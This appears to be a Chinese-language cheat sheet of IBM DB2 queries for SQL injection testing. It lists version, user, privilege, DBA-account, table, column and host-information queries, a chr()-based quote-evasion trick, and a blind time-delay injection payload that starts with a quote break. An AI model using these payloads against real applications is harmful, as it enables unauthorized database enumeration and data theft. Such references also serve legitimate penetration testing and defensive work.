## 查询语句

版本信息
```sql
select versionnumber, version_timestamp from sysibm.sysversions;
select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
select getvariable('sysibm.version') from sysibm.sysdummy1 -- (v8+)
select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo
select service_level,bld_level from sysibmadm.env_inst_info
```

注释
 ```sql
 select blah from foo --
 ```

当前用户
 ```sql
select user from sysibm.sysdummy1
select session_user from sysibm.sysdummy1
select system_user from sysibm.sysdummy1
 ```

列出用户
 ```sql
select distinct(authid) from sysibmadm.privileges --
select grantee from syscat.dbauth --
select distinct(definer) from syscat.schemata --
select distinct(grantee) from sysibm.systabauth --
 ```

列出权限
 ```sql
select * from syscat.tabauth --
select * from syscat.tabauth where grantee = current user --
select * from syscat.dbauth where grantee = current user;;
select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies
 ```

列出DBA账户
 ```sql
select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'
select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’
 ```

当前数据库
```sql
select current server from sysibm.sysdummy1
```

列出数据库
```sql
select distinct(table_catalog) from sysibm.tables
SELECT schemaname FROM syscat.schemata;
```

列
```sql
select name, tbname, coltype from sysibm.syscolumns
```

表
```sql
select table_name from sysibm.tables
select name from sysibm.systables
```

列名称查找表
```sql
select tbname from sysibm.syscolumns where name='username'
```

选择第N行
```sql
select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only
```

选择第N个字符
```sql
select substr('abc',2,1) FROM sysibm.sysdummy1
```

按位与/或/非/异或
```sql
select bitand(1,0) from sysibm.sysdummy1  //返回为0.其它可选bitandnot、bitor、bitxor、bitnot
```

ASCII值
```sql
select chr(65) from sysibm.sysdummy1
```

字符-->ASCII值
```sql
select ascii('A') from sysibm.sysdummy1
```

Cast查询
```sql
select cast('123' as integer) from sysibm.sysdummy1
select cast(1 as char) from sysibm.sysdummy1
```

字符串拼接
```sql
select 'a' concat 'b' concat 'c' from sysibm.sysdummy1
select 'a' || 'b' from sysibm.sysdummy1
```

Case查询
```sql
select CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END from sysibm.sysdummy1
```

引号规避
```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
```

时间延迟
```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68
```

序列化为XML
```sql
select xmlagg(xmlrow(table_schema)) from sysibm.tables
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables
```

主机名/IP和操作系统
```sql
select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info
```

数据库文件位置查询
```sql
select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'
```

系统配置
```sql
select dbpartitionnum, name, value from sysibmadm.dbcfg where name like 'auto_%'
select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg
```

默认系统数据库

> +SYSIBM
> +SYSCAT
> +SYSSTAT
> +SYSPUBLIC
> +SYSIBMADM
> +SYSTOOLs
